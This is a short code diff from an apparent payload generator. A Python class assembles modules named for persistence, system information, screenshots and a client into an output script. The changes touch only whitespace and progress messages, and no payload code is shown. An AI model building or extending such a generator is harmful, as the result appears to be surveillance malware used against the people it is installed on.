@@ -663,16 +663,15 @@ class GENERATOR:
         fname = os.path.join(dirname, 'cl.py')
 
         return (dirname, fname, 'cl.py')
-    
-    
+
 
     def patch(self):
         time.sleep(2)
-        pull.function("Compiling modules..")
+        pull.function("Compiling modules....")
         self.data = self.v_imports + "\n\n" + self.v_consts + "\n" + self.v_persistence + "\n" + self.v_sysinfo + "\n\n" + \
-                self.v_screenshot + "\n\n" + self.v_client + "\n\n" + self.v_main
+                    self.v_screenshot + "\n\n" + self.v_client + "\n\n" + self.v_main
         time.sleep(2)
-        pull.function("Generating Source Code..")
+        pull.function("Generating Source Code...")
         fl = open(self.output, 'w')
         fl.write(self.data)
         fl.close()
